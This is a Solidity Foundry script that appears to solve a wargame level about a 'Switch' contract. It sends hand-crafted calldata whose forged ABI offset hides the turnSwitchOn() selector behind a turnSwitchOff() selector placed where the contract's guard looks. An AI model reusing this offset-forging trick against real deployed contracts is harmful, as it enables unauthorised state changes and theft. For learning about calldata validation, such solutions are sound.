// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Switch.sol";
import "forge-std/Script.sol";

contract SwitchSol is Script {
    Switch switch_ = Switch(0xfEE41E449fa0DA76F8E5f3cdc76DE7fc32762032);

    function run() external {
        vm.startBroadcast();
    
        console.log(switch_.switchOn());

        bytes memory data = abi.encodePacked(bytes4(keccak256("flipSwitch(bytes)")), uint256(96), bytes32(0), bytes4(keccak256("turnSwitchOff()")), bytes28(0), uint256(4), bytes4(keccak256("turnSwitchOn()")));
        address(switch_).call(data);
        
        console.log(switch_.switchOn());

        vm.stopBroadcast();
    }
}